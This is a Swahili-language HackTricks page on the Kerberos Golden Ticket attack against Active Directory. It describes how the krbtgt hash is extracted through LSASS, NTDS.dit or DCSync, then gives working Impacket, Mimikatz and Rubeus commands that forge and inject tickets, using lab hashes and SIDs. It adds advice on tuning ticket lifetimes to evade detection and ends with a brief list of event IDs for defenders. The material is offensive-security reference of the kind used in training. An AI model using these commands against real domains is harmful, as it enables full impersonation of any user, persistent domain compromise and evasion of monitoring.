# Tiketi ya Dhahabu

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Tiketi ya Dhahabu

Shambulio la **Tiketi ya Dhahabu** linajumuisha **kuunda Tiketi Halali ya Kutoa Tiketi (TGT) kwa kujifanya kuwa mtumiaji yeyote** kwa kutumia **hash ya NTLM ya akaunti ya krbtgt ya Active Directory (AD)**. Mbinu hii ni muhimu sana kwa sababu inawezesha **upatikanaji wa huduma au mashine yoyote** ndani ya kikoa kama mtumiaji anayejifanya. Ni muhimu kukumbuka kuwa **vyeti vya akaunti ya krbtgt havisasishwi moja kwa moja**.

Kwa **kupata hash ya NTLM** ya akaunti ya krbtgt, njia mbalimbali zinaweza kutumika. Inaweza kuchimbwa kutoka kwa **huduma ya Subsystem ya Mamlaka ya Usalama wa Mitaa (LSASS)** au faili ya **NT Directory Services (NTDS.dit)** iliyoko kwenye Kudhibiti Mfumo wa Kikoa (DC) yoyote ndani ya kikoa. Zaidi ya hayo, **kutekeleza shambulio la DCsync** ni mkakati mwingine wa kupata hash hii ya NTLM, ambayo inaweza kufanywa kwa kutumia zana kama **moduli ya lsadump::dcsync** katika Mimikatz au **script ya secretsdump.py** ya Impacket. Ni muhimu kusisitiza kuwa kutekeleza shughuli hizi, kwa kawaida inahitajika **kuwa na mamlaka ya msimamizi wa kikoa au kiwango sawa cha ufikiaji**.

Ingawa hash ya NTLM inatumika kama njia inayofaa kwa kusudi hili, ni **inapendekezwa sana** kuwa **tiketi zinazoundwa zitumie funguo za Kerberos za Advanced Encryption Standard (AES) (AES128 na AES256)** kwa sababu za usalama wa uendeshaji.


{% code title="Kutoka Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% code title="Kutoka kwa Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**Baada ya** kuwa na **Tiketi ya Dhahabu iliyowekwa**, unaweza kupata ufikiaji wa faili zilizoshirikiwa **(C$)**, na kutekeleza huduma na WMI, hivyo unaweza kutumia **psexec** au **wmiexec** kupata kifaa cha kudhibiti (inavyoonekana huwezi kupata kifaa cha kudhibiti kupitia winrm).

### Kuepuka kugunduliwa kwa kawaida

Njia za kawaida za kugundua tiketi ya dhahabu ni kwa **kuchunguza trafiki ya Kerberos** kwenye mtandao. Kwa chaguo-msingi, Mimikatz **inasaini TGT kwa miaka 10**, ambayo itaonekana kama isiyo ya kawaida katika maombi ya TGS yaliyofanywa baadaye nayo.

`Muda wa Maisha: 3/11/2021 12:39:57 PM; 3/9/2031 12:39:57 PM; 3/9/2031 12:39:57 PM`

Tumia vigezo vya `/startoffset`, `/endin`, na `/renewmax` ili kudhibiti kuanza kwa kuchelewa, muda wa kudumu, na idadi kubwa ya kurejesha (yote kwa dakika).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Kwa bahati mbaya, muda wa TGT haurekodiwa katika 4769, kwa hivyo hutapata habari hii katika magogo ya matukio ya Windows. Walakini, unaweza kuhusisha **kuona 4769 bila 4768 ya awali**. **Haiwezekani kuomba TGS bila TGT**, na ikiwa hakuna rekodi ya TGT iliyotolewa, tunaweza kudhani kuwa ilifanywa nje ya mtandao.

Ili **kuepuka ukaguzi huu**, angalia tiketi za almasi:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Kupunguza Athari

* 4624: Ingia kwenye Akaunti
* 4672: Ingia kama Msimamizi
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Mbinu ndogo nyingine ambazo walinzi wanaweza kufanya ni **kutoa tahadhari kwa 4769 kwa watumiaji wenye nyadhifa nyeti** kama akaunti ya msimamizi wa kikoa ya chaguo-msingi.

## Marejeo
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets] (https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
